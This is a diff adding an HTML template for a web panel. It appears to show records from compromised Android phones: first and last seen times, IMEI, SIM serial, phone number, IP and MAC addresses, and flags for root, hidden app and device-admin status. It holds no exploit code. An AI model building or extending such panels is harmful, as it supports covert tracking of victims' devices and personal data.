@@ -1,0 +1,100 @@
+<div class="ui segment">
+    <div class="ui statistics four">
+        <div class="statistic" style="    min-width: 22%!important;"></div>
+        <div class="statistic" style="margin-right: 20px;">
+            <div class="text value">
+            	First Seen<br>
+            	<% let dateFirst = new Date(pageData[1].firstSeen);
+            	   let dateLast = new Date(pageData[1].lastSeen);  %>
+            	<p><%= dateFirst.toLocaleString('ru-RU', { timeZone: 'Asia/Yekaterinburg' }) %></p>
+
+            </div>
+        </div>
+        <div class="statistic">
+            <div class="text value">
+                Last Seen<br>
+            	<p><%= dateLast.toLocaleString('ru-RU', { timeZone: 'Asia/Yekaterinburg' }) %></p>
+            </div>
+        </div>
+        <div class="statistic"></div>
+    </div>
+
+   <div class="ui bottom attached tab segment active">
+   		<table class="ui sortable celled table">
+   			<thead>
+	            <tr>
+	                <th>1</th>
+	                <th>2</th>
+	               
+	            </tr>
+	        </thead>
+	        <tbody>
+	            <tr>
+	                <td>IMEI: </td> <td><%= pageData[0].IMEI %></td>
+	            </tr>
+	            <tr>
+	            	<td>ID: </td> <td><%= pageData[0].DeviceID %></td>
+	            </tr>
+	            <tr>
+	            	<td>SoftwareVersion: </td> <td><%= pageData[0].SoftwareVersion %></td>
+	            </tr>
+	            <tr>
+	            	<td>CountryCode: </td> <td><%= pageData[0].CountryCode %></td>
+	            </tr>
+	            <tr>
+	            	<td>OperatorName: </td> <<td><%= pageData[0].OperatorName %></td>
+	            </tr>
+	            <tr>
+	            	<td>OperatorCode: </td> <td><%= pageData[0].OperatorCode %></td>
+	            </tr>
+	            <tr>
+	            	<td>SimCountryCode: </td>  <td><%= pageData[0].SimCountryCode %></td>
+	            </tr>
+	            <tr>
+	            	<td>SimOperatorName: </td> <td><%= pageData[0].SimOperatorName %></td>
+	            </tr>
+	            <tr>
+	            	<td>SimOperatorCode: </td>   <td><%= pageData[0].SimOperatorCode %></td>
+	            </tr>
+	            <tr>
+	            	<td>SimSerial: </td> <td><%= pageData[0].SimSerial %></td>
+	            </tr>
+	            <tr>
+	            	<td>PhoneNumber: </td>  <td><%= pageData[0].PhoneNumber %></td>
+	            </tr>
+	            <tr>
+	            	<td>AudioMode: </td>  <td><%= pageData[0].AudioMode %></td>
+	            </tr>
+	            <tr>
+	            	<td>AudioRingerMode: </td>  <td><%= pageData[0].AudioRingerMode %></td>
+	            </tr>
+	            <tr>
+	            	<td>IPAddress: </td>  <td><%= pageData[0].IPAddress %></td>
+	            </tr>
+	            <tr>
+	            	<td>LoIPAddress: </td> <td><%= pageData[0].LOIPAddress %></td>
+	            </tr>
+	            <tr>
+	            	<td>WIPAddress: </td> <td><%= pageData[0].WIPAddress %></td>
+	            </tr>
+	            <tr>
+	            	<td>MACAddressETH0: </td> <td><%= pageData[0].MACAddressETH0 %></td>
+	            </tr>
+	            <tr>
+	            	<td>MACAddressWLAN0: </td>  <td><%= pageData[0].MACAddressWLAN0 %></td>
+	            </tr>
+	            <tr>
+	            	<td>Root: </td>  <td><%= pageData[0].Root %></td>
+	            </tr>
+	            <tr>
+	            	<td>hideApp: </td> <td><%= pageData[0].hideApp %></td>
+	            </tr>
+	            <tr>
+	            	<td>admin: </td> <td><%= pageData[0].admin %></td>
+	            </tr>
+
+
+	        </tbody>
+	    </table>
+   </div>
+</div>
